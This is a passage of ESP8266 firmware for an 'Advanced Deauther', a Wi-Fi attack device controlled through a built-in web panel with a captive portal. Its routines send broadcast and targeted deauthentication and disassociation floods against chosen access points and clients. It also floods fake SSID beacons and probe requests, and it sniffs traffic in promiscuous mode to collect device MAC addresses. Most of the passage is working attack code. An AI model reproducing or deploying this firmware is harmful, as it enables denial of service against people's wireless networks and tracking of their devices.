    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/probe/stop", HTTP_GET, []() {
    probeAttack = false;
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/monitor/start", HTTP_GET, []() {
    packetMonitor = true;
    wifi_set_promiscuous_rx_cb(packetSniffer);
    wifi_promiscuous_enable(1);
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/monitor/stop", HTTP_GET, []() {
    packetMonitor = false;
    wifi_promiscuous_enable(0);
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/ssids", HTTP_GET, handleSSIDs);
  server.on("/ssids/add", HTTP_POST, []() {
    String body = server.arg("plain");
    // Simple JSON parsing for SSID
    int start = body.indexOf("\"ssid\":\"") + 8;
    int end = body.indexOf("\"", start);
    if (start > 7 && end > start && ssidList.size() < MAX_SSIDS) {
      SSIDData newSSID;
      newSSID.ssid = body.substring(start, end);
      newSSID.enabled = true;
      newSSID.wpa2 = true;
      ssidList.push_back(newSSID);
      saveSettings();
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/ssids/remove", HTTP_POST, []() {
    String body = server.arg("plain");
    int start = body.indexOf("\"index\":") + 8;
    int end = body.indexOf(",", start);
    if (end == -1) end = body.indexOf("}", start);
    if (start > 7 && end > start) {
      int index = body.substring(start, end).toInt();
      if (index >= 0 && index < ssidList.size()) {
        ssidList.erase(ssidList.begin() + index);
        saveSettings();
      }
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/api/status", HTTP_GET, handleAPI);
  server.on("/api/pps", HTTP_GET, []() {
    if (server.hasArg("value")) {
      packetsPerSecond = server.arg("value").toInt();
      if (packetsPerSecond < 1) packetsPerSecond = 1;
      if (packetsPerSecond > 100) packetsPerSecond = 100;
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  server.on("/stats", HTTP_GET, handleStats);
  server.on("/stats/reset", HTTP_GET, []() {
    stats.deauthPackets = 0;
    stats.beaconPackets = 0;
    stats.probePackets = 0;
    stats.capturedPackets = 0;
    stats.uniqueDevices = 0;
    server.send(200, "application/json", "{\"success\":true}");
  });

  // Handle all other requests (captive portal)
  server.onNotFound(handleCaptive);

  // Start DNS server for captive portal
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Start web server
  server.begin();

  Serial.println("Advanced Deauther ready!");
  Serial.print("Access Point: ");
  Serial.println(AP_SSID);
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Flash LED to indicate ready
  for (int i = 0; i < 5; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(100);
    digitalWrite(LED_PIN, HIGH);
    delay(100);
  }
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Handle attacks
  if (attacking) {
    performAttack();
  }

  if (beaconSpam) {
    performBeaconSpam();
  }

  if (probeAttack) {
    performProbeAttack();
  }

  // Update LED
  updateLED();

  // Check button for reset
  if (digitalRead(BUTTON_PIN) == LOW) {
    delay(50);
    if (digitalRead(BUTTON_PIN) == LOW) {
      unsigned long pressTime = millis();
      while (digitalRead(BUTTON_PIN) == LOW) {
        if (millis() - pressTime > 3000) {
          Serial.println("Reset button pressed - stopping all attacks");
          attacking = false;
          beaconSpam = false;
          probeAttack = false;
          packetMonitor = false;
          accessPoints.clear();
          stations.clear();
          selectedAPs = 0;
          break;
        }
        delay(100);
      }
    }
  }

  yield();
}

void startAP() {
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);

  delay(500);
  Serial.print("Access Point started: ");
  Serial.println(WiFi.softAPIP());
}

void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(200, "text/html", htmlPage);
}

void handleCaptive() {
  if (captivePortal) {
    server.sendHeader("Location", "http://192.168.4.1", true);
    server.send(302, "text/plain", "");
  } else {
    server.send(404, "text/plain", "Not found");
  }
}

void handleScan() {
  if (scanning) {
    server.send(200, "application/json", "{\"error\":\"Scan already in progress\"}");
    return;
  }

  scanning = true;
  Serial.println("Starting advanced WiFi scan...");

  accessPoints.clear();
  stations.clear();

  // Enable monitor mode for station detection
  wifi_set_promiscuous_rx_cb(packetSniffer);
  wifi_promiscuous_enable(1);

  int networkCount = WiFi.scanNetworks(false, true); // Sync scan with hidden networks
  if (networkCount < 0) networkCount = 0; // Handle scan error

  String json = "{\"networks\":[";

  for (int i = 0; i < networkCount && i < 50; i++) { // Limit to prevent memory issues
    if (i > 0) json += ",";

    AccessPoint ap;
    ap.ssid = WiFi.SSID(i);
    ap.channel = WiFi.channel(i);
    ap.rssi = WiFi.RSSI(i);
    ap.bssid = WiFi.BSSIDstr(i);
    ap.selected = false;
    ap.hidden = (ap.ssid.length() == 0);

    // Determine encryption type
    switch (WiFi.encryptionType(i)) {
      case ENC_TYPE_WEP: ap.encryption = "WEP"; break;
      case ENC_TYPE_TKIP: ap.encryption = "WPA"; break;
      case ENC_TYPE_CCMP: ap.encryption = "WPA2"; break;
      case ENC_TYPE_NONE: ap.encryption = "Open"; break;
      case ENC_TYPE_AUTO: ap.encryption = "WPA/WPA2"; break;
      default: ap.encryption = "Unknown"; break;
    }

    accessPoints.push_back(ap);

    // Escape SSID for JSON
    String escapedSSID = ap.ssid;
    escapedSSID.replace("\"", "\\\"");
    escapedSSID.replace("\\", "\\\\");

    json += "{";
    json += "\"ssid\":\"" + escapedSSID + "\",";
    json += "\"channel\":" + String(ap.channel) + ",";
    json += "\"rssi\":" + String(ap.rssi) + ",";
    json += "\"bssid\":\"" + ap.bssid + "\",";
    json += "\"selected\":false,";
    json += "\"hidden\":" + String(ap.hidden ? "true" : "false") + ",";
    json += "\"encryption\":\"" + ap.encryption + "\"";
    json += "}";

    yield(); // Prevent watchdog reset
  }

  json += "],\"stations\":[";

  // Add detected stations with size limit
  size_t stationLimit = minVal((size_t)20, stations.size());
  for (size_t i = 0; i < stationLimit; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"mac\":\"" + stations[i].mac + "\",";
    json += "\"ap_mac\":\"" + stations[i].ap_mac + "\",";
    json += "\"channel\":" + String(stations[i].channel) + ",";
    json += "\"rssi\":" + String(stations[i].rssi);
    json += "}";
    yield(); // Prevent watchdog reset
  }

  json += "]}";

  wifi_promiscuous_enable(0);
  scanning = false;
  Serial.println("Advanced scan completed: " + String(networkCount) + " networks, " + String(stations.size()) + " stations found");

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleAttack() {
  if (attacking) {
    server.send(200, "application/json", "{\"error\":\"Attack already in progress\"}");
    return;
  }

  String body = server.arg("plain");
  Serial.println("Advanced attack request received");

  selectedAPs = 0;
  for (int i = 0; i < accessPoints.size(); i++) {
    String ssidSearch = "\"ssid\":\"" + accessPoints[i].ssid + "\"";
    if (body.indexOf(ssidSearch) != -1) {
      accessPoints[i].selected = true;
      selectedAPs++;
    }
  }

  if (selectedAPs > 0) {
    attacking = true;
    attackStartTime = millis();
    totalPackets = 0;
    Serial.println("Starting advanced attack on " + String(selectedAPs) + " networks");
    server.send(200, "application/json", "{\"success\":true,\"message\":\"Advanced attack started\"}");
  } else {
    server.send(200, "application/json", "{\"error\":\"No networks selected\"}");
  }
}

void handleStop() {
  attacking = false;
  beaconSpam = false;
  probeAttack = false;
  packetMonitor = false;
  wifi_promiscuous_enable(0);
  Serial.println("All attacks stopped");
  server.send(200, "application/json", "{\"success\":true,\"message\":\"All attacks stopped\"}");
}

void handleSSIDs() {
  String json = "{\"ssids\":[";

  size_t ssidLimit = minVal((size_t)50, ssidList.size());
  for (size_t i = 0; i < ssidLimit; i++) {
    if (i > 0) json += ",";

    // Escape SSID for JSON
    String escapedSSID = ssidList[i].ssid;
    escapedSSID.replace("\"", "\\\"");
    escapedSSID.replace("\\", "\\\\");

    json += "{";
    json += "\"ssid\":\"" + escapedSSID + "\",";
    json += "\"enabled\":" + String(ssidList[i].enabled ? "true" : "false") + ",";
    json += "\"wpa2\":" + String(ssidList[i].wpa2 ? "true" : "false");
    json += "}";
    yield(); // Prevent watchdog reset
  }

  json += "]}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleStats() {
  String json = "{";
  json += "\"deauth\":" + String(stats.deauthPackets) + ",";
  json += "\"beacon\":" + String(stats.beaconPackets) + ",";
  json += "\"probe\":" + String(stats.probePackets) + ",";
  json += "\"captured\":" + String(stats.capturedPackets) + ",";
  json += "\"devices\":" + String(stats.uniqueDevices);
  json += "}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleAPI() {
  String json = "{";
  json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
  json += "\"scanning\":" + String(scanning ? "true" : "false") + ",";
  json += "\"beacon\":" + String(beaconSpam ? "true" : "false") + ",";
  json += "\"probe\":" + String(probeAttack ? "true" : "false") + ",";
  json += "\"monitor\":" + String(packetMonitor ? "true" : "false") + ",";
  json += "\"networks\":" + String(accessPoints.size()) + ",";
  json += "\"stations\":" + String(stations.size()) + ",";
  json += "\"selected\":" + String(selectedAPs) + ",";
  json += "\"captured\":" + String(stats.capturedPackets) + ",";
  json += "\"devices\":" + String(stats.uniqueDevices);
  json += "}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void performAttack() {
  static unsigned long lastAttack = 0;
  static int currentAP = 0;
  static int packetType = 0;
  static uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  unsigned long interval = 1000 / packetsPerSecond;

  if (millis() - lastAttack > interval) {
    lastAttack = millis();

    int attempts = 0;
    while (attempts < accessPoints.size()) {
      if (currentAP >= accessPoints.size()) {
        currentAP = 0;
      }

      if (accessPoints[currentAP].selected) {
        String bssid = accessPoints[currentAP].bssid;
        uint8_t mac[6];

        // Parse BSSID string to MAC array
        for (int i = 0; i < 6; i++) {
          String hex = bssid.substring(i * 3, i * 3 + 2);
          mac[i] = strtol(hex.c_str(), NULL, 16);
        }

        // Set WiFi channel
        wifi_set_channel(accessPoints[currentAP].channel);

        // Enhanced attack with multiple vectors
        if (packetType == 0) {
          // Broadcast deauth to all clients
          for (int i = 0; i < 6; i++) {
            deauthPacket[4 + i] = 0xFF;  // Broadcast target
            deauthPacket[10 + i] = mac[i]; // AP source
            deauthPacket[16 + i] = mac[i]; // BSSID
          }

          // Send multiple deauth packets with different reason codes
          uint8_t reasonCodes[] = {1, 2, 3, 4, 5, 6, 7, 8, 15, 16};
          for (int i = 0; i < 5; i++) {
            deauthPacket[24] = reasonCodes[i % 10];
            wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
            stats.deauthPackets++;
            totalPackets++;
            delayMicroseconds(500);
          }

          // Target specific stations if available
          for (int s = 0; s < stations.size() && s < 3; s++) {
            if (stations[s].ap_mac == bssid) {
              // Parse station MAC
              uint8_t staMac[6];
              for (int j = 0; j < 6; j++) {
                String hex = stations[s].mac.substring(j * 3, j * 3 + 2);
                staMac[j] = strtol(hex.c_str(), NULL, 16);
              }

              // Targeted deauth
              for (int j = 0; j < 6; j++) {
                deauthPacket[4 + j] = staMac[j];  // Station target
                deauthPacket[10 + j] = mac[j];    // AP source
              }

              for (int k = 0; k < 2; k++) {
                wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
                stats.deauthPackets++;
                totalPackets++;
                delayMicroseconds(300);
              }
            }
          }
        } else {
          // Enhanced disassociation attack
          for (int i = 0; i < 6; i++) {
            disassocPacket[4 + i] = 0xFF;     // Broadcast target
            disassocPacket[10 + i] = mac[i];  // AP source
            disassocPacket[16 + i] = mac[i];  // BSSID
          }

          // Send disassociation with multiple reason codes
          uint8_t disassocReasons[] = {1, 2, 3, 5, 8, 12, 13, 14};
          for (int i = 0; i < 4; i++) {
            disassocPacket[24] = disassocReasons[i % 8];
            wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);
            stats.deauthPackets++;
            totalPackets++;
            delayMicroseconds(400);
          }
        }

        packetType = (packetType + 1) % 2;
        break;
      }

      currentAP++;
      attempts++;
    }

    currentAP++;
  }
}

void performBeaconSpam() {
  static unsigned long lastBeacon = 0;
  static int currentSSID = 0;
  static uint8_t macBase[3] = {0x00, 0x00, 0x00};

  if (millis() - lastBeacon > 50) { // Send beacons every 50ms for higher density
    lastBeacon = millis();

    // Find next enabled SSID
    int attempts = 0;
    while (attempts < (int)ssidList.size()) {
      if (currentSSID >= (int)ssidList.size()) {
        currentSSID = 0;
      }

      if (ssidList[currentSSID].enabled) {
        String ssid = ssidList[currentSSID].ssid;

        // Create multiple beacons per SSID for better visibility
        for (int beaconCount = 0; beaconCount < 2; beaconCount++) {
          uint8_t packet[128];
          memcpy(packet, beaconPacket, sizeof(beaconPacket));

          // Realistic MAC address generation
          packet[10] = 0x02; // Locally administered bit
          packet[11] = random(0x00, 0xFF);
          packet[12] = random(0x00, 0xFF);
          packet[13] = random(0x00, 0xFF);
          packet[14] = random(0x00, 0xFF);
          packet[15] = random(0x00, 0xFF);

          // Copy source to BSSID
          memcpy(&packet[16], &packet[10], 6);

          // Random timestamp
          uint64_t timestamp = esp_random();
          memcpy(&packet[24], &timestamp, 8);

          // Random beacon interval (100-1000ms)
          uint16_t beaconInterval = random(100, 1000);
          packet[32] = beaconInterval & 0xFF;
          packet[33] = (beaconInterval >> 8) & 0xFF;

          // Capability info with realistic flags
          packet[34] = 0x01; // ESS capability
          packet[35] = ssidList[currentSSID].wpa2 ? 0x10 : 0x00; // Privacy bit

          // SSID element
          int ssidLen = minVal(32, (int)ssid.length());
          packet[37] = ssidLen;
          for (int i = 0; i < ssidLen; i++) {
            packet[38 + i] = ssid[i];
          }

          int pos = 38 + ssidLen;

          // Supported rates element
          packet[pos++] = 0x01; // Element ID
          packet[pos++] = 0x08; // Length
          uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
          memcpy(&packet[pos], rates, 8);
          pos += 8;

          // DS Parameter Set (channel)
          packet[pos++] = 0x03; // Element ID
          packet[pos++] = 0x01; // Length
          packet[pos++] = random(1, 14); // Random channel

          // WPA/WPA2 information elements for encrypted networks
          if (ssidList[currentSSID].wpa2) {
            // RSN Information Element (WPA2)
            packet[pos++] = 0x30; // Element ID
            packet[pos++] = 0x14; // Length
            uint8_t rsnInfo[] = {
              0x01, 0x00, // Version
              0x00, 0x0F, 0xAC, 0x02, // Group cipher (TKIP)
              0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, // Pairwise cipher (CCMP)
              0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, // AKM suite (PSK)
              0x00, 0x00 // RSN capabilities
            };
            memcpy(&packet[pos], rsnInfo, 20);
            pos += 20;
          }

          // Send the beacon
          wifi_send_pkt_freedom(packet, pos, 0);
          stats.beaconPackets++;
          delayMicroseconds(random(100, 500));
        }

        break;
      }

      currentSSID++;
      attempts++;
    }

    currentSSID++;
  }
}

void performProbeAttack() {
  static unsigned long lastProbe = 0;
  static int currentSSID = 0;

  if (millis() - lastProbe > 200) { // Send probe every 200ms
    lastProbe = millis();

    // Find next enabled SSID
    int attempts = 0;
    while (attempts < (int)ssidList.size()) {
      if (currentSSID >= (int)ssidList.size()) {
        currentSSID = 0;
      }

      if (ssidList[currentSSID].enabled) {
        String ssid = ssidList[currentSSID].ssid;

        // Prepare probe packet
        uint8_t packet[68];
        memcpy(packet, probePacket, sizeof(probePacket));

        // Random MAC address
        for (int i = 10; i < 16; i++) {
          packet[i] = random(0, 255);
        }

        // Set SSID in probe packet - ensure proper bounds
        int ssidLen = minVal(32, (int)ssid.length());
        packet[25] = ssidLen;
        for (int i = 0; i < ssidLen; i++) {
          packet[26 + i] = ssid[i];
        }

        // Send probe packet with proper size calculation
        int packetSize = 26 + ssidLen + 15;
        if (packetSize > 68) packetSize = 68;
        wifi_send_pkt_freedom(packet, packetSize, 0);
        stats.probePackets++;

        break;
      }

      currentSSID++;
      attempts++;
    }

    currentSSID++;
  }
}

void packetSniffer(uint8_t *buf, uint16_t len) {
  if (!packetMonitor || !buf || len < 24) return;

  stats.capturedPackets++;

  // Advanced packet analysis
  uint8_t frameType = buf[0] & 0xFC;
  uint8_t frameSubtype = (buf[0] & 0xF0) >> 4;

  // Track unique devices with MAC analysis
  static uint8_t seenMACs[200][6];
  static int macCount = 0;
  static unsigned long lastCleanup = 0;

  // Cleanup old entries every 5 minutes
  if (millis() - lastCleanup > 300000) {
    macCount = 0;
    lastCleanup = millis();
  }

  // Extract source MAC based on frame type
  uint8_t* srcMAC = nullptr;
  uint8_t* dstMAC = nullptr;
  uint8_t* bssid = nullptr;

  if (len >= 24) {
    // Management and control frames
    if ((frameType & 0x0C) == 0x00 || (frameType & 0x0C) == 0x04) {
      dstMAC = &buf[4];
      srcMAC = &buf[10];
      bssid = &buf[16];
    }
    // Data frames
    else if ((frameType & 0x0C) == 0x08) {
      dstMAC = &buf[4];
      bssid = &buf[10];
      srcMAC = &buf[16];
    }

    // Track source MAC
    if (srcMAC && macCount < 200) {
      bool isNew = true;
      for (int i = 0; i < macCount; i++) {
        if (memcmp(seenMACs[i], srcMAC, 6) == 0) {
          isNew = false;
          break;
        }
      }

      if (isNew) {
        memcpy(seenMACs[macCount], srcMAC, 6);
        macCount++;
        stats.uniqueDevices = macCount;
      }
    }

    // Track destination MAC if different
    if (dstMAC && macCount < 200 && 
        !(dstMAC[0] == 0xFF && dstMAC[1] == 0xFF && dstMAC[2] == 0xFF && 
          dstMAC[3] == 0xFF && dstMAC[4] == 0xFF && dstMAC[5] == 0xFF)) {
      bool isNew = true;
      for (int i = 0; i < macCount; i++) {
        if (memcmp(seenMACs[i], dstMAC, 6) == 0) {
          isNew = false;
          break;
        }
      }

      if (isNew) {
        memcpy(seenMACs[macCount], dstMAC, 6);
        macCount++;
        stats.uniqueDevices = macCount;
      }
    }

    // Analyze specific frame types for intelligence gathering
    switch (frameType) {
      case 0x40: // Probe Request
        // Extract SSID from probe requests
        if (len > 26) {
          uint8_t ssidLen = buf[25];
          if (ssidLen > 0 && ssidLen < 33 && len >= 26 + ssidLen) {
            // Could log interesting SSIDs here
          }
        }
        break;
        
      case 0x80: // Beacon
        // Extract network information from beacons
        if (len > 38) {
          uint8_t ssidLen = buf[37];
          if (ssidLen > 0 && ssidLen < 33 && len >= 38 + ssidLen) {
            // Could log beacon networks here
          }
        }
        break;
        
      case 0x50: // Probe Response
      case 0x10: // Association Request
      case 0x30: // Reassociation Request
        // Track association attempts
        break;
        
      case 0xC0: // Deauthentication
      case 0xA0: // Disassociation
        // Track deauth/disassoc activity (could detect other deauthers)
        break;
    }
  }
}

void updateLED() {
  static unsigned long lastLED = 0;
  static bool ledState = false;

  unsigned long interval = 1000; // Default slow blink

  if (attacking || beaconSpam || probeAttack) {
    interval = 100; // Fast blink when active
  } else if (scanning || packetMonitor) {
    interval = 250; // Medium blink when scanning/monitoring
  }

  if (millis() - lastLED > interval) {
    lastLED = millis();
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState ? LOW : HIGH); // Inverted for ESP8266
  }
}

void saveSettings() {
  // Save settings to EEPROM
  EEPROM.write(0, packetsPerSecond);
  EEPROM.write(1, captivePortal ? 1 : 0);
  EEPROM.write(2, minVal(MAX_SSIDS, (int)ssidList.size()));

  int addr = 3;
  for (int i = 0; i < ssidList.size() && i < MAX_SSIDS && addr < 500; i++) {
    int ssidLen = minVal(32, (int)ssidList[i].ssid.length());
    EEPROM.write(addr++, ssidLen);
    for (int j = 0; j < ssidLen && addr < 500; j++) {
      EEPROM.write(addr++, ssidList[i].ssid[j]);
    }
    if (addr < 500) EEPROM.write(addr++, ssidList[i].enabled ? 1 : 0);
    if (addr < 500) EEPROM.write(addr++, ssidList[i].wpa2 ? 1 : 0);
  }

  EEPROM.commit();
}

void loadSettings() {
  // Load settings from EEPROM
  packetsPerSecond = EEPROM.read(0);
  if (packetsPerSecond < 1 || packetsPerSecond > 100) packetsPerSecond = 20;

  captivePortal = EEPROM.read(1) == 1;

  int ssidCount = EEPROM.read(2);
  if (ssidCount > MAX_SSIDS || ssidCount < 0) ssidCount = 0;

  int addr = 3;
  ssidList.clear();

  for (int i = 0; i < ssidCount && addr < 500; i++) {
    SSIDData ssid;
    int len = EEPROM.read(addr++);
    if (len > 32 || len < 0 || addr >= 500) break; // Invalid data

    ssid.ssid = "";
    for (int j = 0; j < len && addr < 500; j++) {
      ssid.ssid += (char)EEPROM.read(addr++);
    }
    if (addr < 500) ssid.enabled = EEPROM.read(addr++) == 1;
    if (addr < 500) ssid.wpa2 = EEPROM.read(addr++) == 1;

    ssidList.push_back(ssid);
  }
}
